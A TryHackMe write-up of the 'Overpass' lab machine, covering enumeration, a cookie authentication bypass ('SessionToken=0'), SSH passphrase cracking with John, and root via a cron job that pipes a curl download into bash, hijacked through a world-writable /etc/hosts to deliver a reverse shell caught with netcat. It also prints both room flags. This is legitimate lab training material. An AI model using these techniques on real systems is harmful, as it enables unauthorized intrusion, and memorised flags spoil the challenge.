# Overpass - TryHackMe Writeup

## Room Information

- **Room:** Overpass
- **Difficulty:** Easy
- **Platform:** TryHackMe

## Objective

Gain initial access to the target machine, obtain the user flag, identify a privilege escalation path, and gain root access.

---

# Enumeration

## Connectivity Check

Before starting enumeration, verify that the target machine is reachable.

```bash
ping 10.48.143.193
```

The target responded successfully, confirming network connectivity.

---

## Nmap Scan

Perform a basic port scan to identify exposed services.

```bash
nmap 10.48.143.193
```

### Results

| Port | State | Service |
|--------|--------|---------|
| 22/tcp | Open | SSH |
| 80/tcp | Open | HTTP |

### Analysis

Only two services were exposed:

- **SSH (22)** → Potential remote access service.
- **HTTP (80)** → Web application that may contain vulnerabilities.

Since web services often provide an attack surface, web enumeration became the next step.

---

# Web Enumeration

## Directory Enumeration

Use Gobuster to discover hidden directories and files.

```bash
gobuster dir -u http://10.48.143.193 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Results

| Directory | Status |
|------------|--------|
| /downloads | 301 |
| /img | 301 |
| /admin | 301 |
| /aboutus | 301 |
| /css | 301 |

### Analysis

The most interesting discovery was:

```text
/admin
```

Administrative panels often contain sensitive functionality or credentials.

---

# Investigating the Admin Panel

Browsing to:

```text
http://10.48.143.193/admin
```

presented a login page.

To understand how authentication worked, inspect the page source.

### JavaScript Files Referenced

```html
<script src="/main.js"></script>
<script src="/login.js"></script>
<script src="/cookie.js"></script>
```

The interesting file was:

```text
login.js
```

---

# Understanding Authentication

Reviewing the contents of `login.js` revealed:

```javascript
 const statusOrCookie = await response.text()

    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }

```

### What does this mean?

After successful authentication:

1. The server returns a value.
2. That value is stored in a browser cookie named:

```text
SessionToken
```

3. The browser is redirected to `/admin`.

This suggested that access to the administrator area depended on the presence of a valid session cookie.

---

# Authentication Bypass

Instead of logging in normally, manually provide a cookie value and request the admin page.

```bash
curl 'http://10.48.143.193/admin/' --cookie 'SessionToken=0'
```

### Result

The administrator page loaded successfully.

### Why did this work?

The application failed to properly validate the session token.

Simply supplying:

```text
SessionToken=0
```

was enough to bypass authentication and access restricted content.

This is an example of **broken authentication**.

---

# Obtaining SSH Credentials

Inside the administrator panel was a note intended for user **James**.

The note contained an encrypted SSH private key:

```text
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

### Why is this important?

SSH private keys can be used for remote login instead of passwords.

Copy the key locally:

```bash
nano id_rsa
```

Save the key contents.

Set proper permissions:

```bash
chmod 600 id_rsa
```

SSH refuses to use keys that are accessible by other users.

---

# Attempting SSH Access

Try logging in with the key.

```bash
ssh -i id_rsa james@10.48.143.193
```

### Result

```text
Enter passphrase for key 'id_rsa':
```

The key was encrypted with a passphrase.

The passphrase must be cracked before the key can be used.

---

# Cracking the SSH Key Passphrase

Convert the private key into a format that John the Ripper understands.

```bash
ssh2john id_rsa > hash.txt
```

### Why?

John cannot directly crack SSH private keys.

`ssh2john` extracts the encrypted hash and converts it into a crackable format.

---

Run John against the hash:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After cracking completes:

```bash
john --show hash.txt
```

### Result

```text
id_rsa:james13
```

The passphrase is:

```text
james13
```

---

# Initial Access

Use the private key together with the cracked passphrase.

```bash
ssh -i id_rsa james@10.48.143.193
```

Enter:

```text
james13
```

when prompted.

Verify access:

```bash
whoami
```

Output:

```text
james
```

Initial access achieved.

---

# User Flag

List files in James' home directory.

```bash
ls
```

Output:

```text
todo.txt
user.txt
```

Read the flag:

```bash
cat user.txt
```

### User Flag

```text
thm{65c1aaf000506e56996822c6281e6bf7}
```

---

# Privilege Escalation Enumeration

Now that we have a shell, enumerate the system for misconfigurations.

---

## Inspecting Scheduled Tasks

View the system cron jobs.

```bash
cat /etc/crontab
```

Interesting entry:

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

### What is happening here?

Every minute:

1. The root user executes `curl`.
2. `curl` downloads a file from:

```text
http://overpass.thm/downloads/src/buildscript.sh
```

3. The downloaded content is immediately passed to:

```bash
bash
```

which executes it as root.

This means:

> If we can control what `overpass.thm` resolves to, we can control the script root executes.

---

## Understanding /etc/hosts

Check permissions on the hosts file.

```bash
ls -l /etc/hosts
```

Output:

```text
-rw-rw-rw- 1 root root
```

### Why is this important?

`/etc/hosts` is a local hostname resolution file.

Before Linux queries DNS servers, it checks this file first.

Example:

```text
192.168.1.10 example.com
```

means:

```text
example.com -> 192.168.1.10
```

If a hostname exists in `/etc/hosts`, the system trusts that mapping.

Because the file is world-writable, any user can modify it.

This is a serious security issue.

---

# Hijacking overpass.thm

Edit the hosts file.

```bash
nano /etc/hosts
```

Original entry:

```text
127.0.1.1 overpass-prod
```

Add:

```text
192.168.130.28 overpass.thm
```

Final result:

```text
127.0.0.1 localhost
127.0.1.1 overpass-prod
192.168.130.28 overpass.thm
```

### What does this do?

Now whenever the machine tries to reach:

```text
overpass.thm
```

it will connect to:

```text
192.168.130.28
```

which is the attacker's machine.

So when root runs:

```bash
curl overpass.thm/downloads/src/buildscript.sh
```

it will download our file instead of the legitimate one.

---

# Preparing the Malicious Server

On the attacker machine create the same directory structure expected by the cron job.

```bash
mkdir downloads
cd downloads

mkdir src
cd src
```

Create the script:

```bash
nano buildscript.sh
```

Insert a Bash reverse shell payload.

Directory structure:

```text
Overpass/
└── downloads/
    └── src/
        └── buildscript.sh
```

---

## Start the HTTP Server to host the file

Move back to the project root:

```bash
cd ~/Overpass
```

Verify:

```bash
tree
```

Output:

```text
.
├── downloads
│   └── src
│       └── buildscript.sh
├── hash.txt
└── id_rsa
```

Start the server:

```bash
python3 -m http.server 80
```

### Why not start it inside downloads/src?

Because the cron job requests:

```text
/downloads/src/buildscript.sh
```

The Python server exposes files relative to the directory where it is started.

Starting it from:

```text
~/Overpass
```

makes this URL valid:

```text
http://ATTACKER-IP/downloads/src/buildscript.sh
```

which perfectly matches the path requested by the victim.

---

# Waiting for the Cron Job

After approximately one minute the victim machine requested the file.

Server log:

```text
GET /downloads/src/buildscript.sh HTTP/1.1
```

This confirms root downloaded our script.

---

# Catching the Reverse Shell

Start a Netcat listener.

```bash
nc -lvnp 4444
```

A few moments later:

```text
connect to [192.168.130.28] from [10.48.143.193]
```

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

Root access achieved.

---

# Root Flag

Navigate to root's directory.

```bash
cd /root
ls
```

Output:

```text
root.txt
```

Read the flag:

```bash
cat root.txt
```

### Root Flag

```text
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

# Attack Path Summary

1. Identified HTTP and SSH services using Nmap.
2. Enumerated web content using Gobuster.
3. Discovered the `/admin` panel.
4. Analyzed `login.js`.
5. Identified cookie-based authentication.
6. Bypassed authentication using `SessionToken=0`.
7. Retrieved an encrypted SSH private key.
8. Cracked the passphrase with John the Ripper.
9. Logged in as James via SSH.
10. Retrieved the user flag.
11. Enumerated cron jobs.
12. Found a root task downloading and executing a script every minute.
13. Discovered `/etc/hosts` was world-writable.
14. Redirected `overpass.thm` to the attacker's machine.
15. Hosted a malicious `buildscript.sh`.
16. Root downloaded and executed the attacker-controlled script.
17. Received a reverse shell as root.
18. Retrieved the root flag.

---

# Findings & Vulnerabilities

| ID   | Finding                                        | Severity |
| ------ | ---------------------------------------------- | -------- |
| F-01 | Authentication Bypass via Session Cookie       | High |
| F-02 | Sensitive SSH Private Key Exposed in Admin Area | High |
| F-03 | Weak SSH Key Passphrase                        | Medium |
| F-04 | World-Writable /etc/hosts File                 | Critical |
| F-05 | Root Cron Job Executing Remote Script          | Critical |
| F-06 | Insecure Trust of Hostname Resolution          | High |

---

# Tools Used

### Enumeration

* Nmap
* Gobuster

### Authentication Testing

* Browser Developer Tools
* Curl

### Credential Access

* SSH2John
* John the Ripper
* SSH

### Privilege Escalation

* Cron Job Enumeration
* Python: HTTP Server to host reverse shell file in accurate path

### Remote Access

* SSH
* Netcat

---

# Flags Obtained

| Flag | Value |
|--------|--------|
| User Flag | thm{65c1aaf000506e56996822c6281e6bf7} |
| Root Flag | thm{7f336f8c359dbac18d54fdd64ea753bb} |

---

# Conclusion

# Conclusion

The Overpass room demonstrated how multiple misconfigurations can be chained together to achieve full system compromise. Initial access was obtained by bypassing authentication and retrieving an encrypted SSH private key, which was cracked to gain access as **james**. Further enumeration revealed a root cron job that downloaded and executed a remote script, while a world-writable `/etc/hosts` file allowed hostname resolution to be redirected to an attacker-controlled server. By exploiting these weaknesses, root access was achieved and the system was fully compromised.

This room provided practical experience with authentication bypass, SSH key attacks, cron job exploitation, and Linux privilege escalation.
